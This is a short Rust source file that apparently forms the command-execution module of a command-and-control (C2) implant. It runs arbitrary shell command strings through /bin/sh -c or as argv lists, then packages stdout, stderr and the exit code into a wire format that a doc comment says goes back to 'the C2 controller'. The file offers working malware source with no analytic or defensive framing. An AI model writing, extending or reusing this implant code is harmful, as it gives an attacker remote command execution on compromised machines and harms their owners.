use std::process::{Command, Output};
use std::io;

/// Executes an arbitrary shell command string and returns its output.
/// The command is passed to `/bin/sh -c` so pipes, redirects, etc. all work.
pub fn run_command(cmd: &str) -> Result<CommandResult, io::Error> {
    let output: Output = Command::new("/bin/sh")
        .arg("-c")
        .arg(cmd)
        .output()?;

    Ok(CommandResult {
        stdout:      String::from_utf8_lossy(&output.stdout).into_owned(),
        stderr:      String::from_utf8_lossy(&output.stderr).into_owned(),
        exit_code:  output.status.code().unwrap_or(-1),
    })
}

/// Executes a command supplied as a pre-split argv list (no shell involvement).
pub fn run_argv(argv: &[&str]) -> Result<CommandResult, io::Error> {
    if argv.is_empty() {
        return Err(io::Error::new(io::ErrorKind::InvalidInput, "empty argv"));
    }
    let output: Output = Command::new(argv[0])
        .args(&argv[1..])
        .output()?;

    Ok(CommandResult {
        stdout:      String::from_utf8_lossy(&output.stdout).into_owned(),
        stderr:      String::from_utf8_lossy(&output.stderr).into_owned(),
        exit_code:  output.status.code().unwrap_or(-1),
    })
}

/// Structured result returned to the C2 controller.
#[derive(Debug)]
pub struct CommandResult {
    pub stdout:    String,
    pub stderr:    String,
    pub exit_code: i32,
}

impl CommandResult {
    /// Serialise to a simple wire format: "EXIT:<code>\nSTDOUT:<stdout>\nSTDERR:<stderr>\n"
    pub fn to_wire(&self) -> String {
        format!(
            "EXIT:{}\nSTDOUT:{}\nSTDERR:{}\n",
            self.exit_code, self.stdout, self.stderr
        )
    }
}
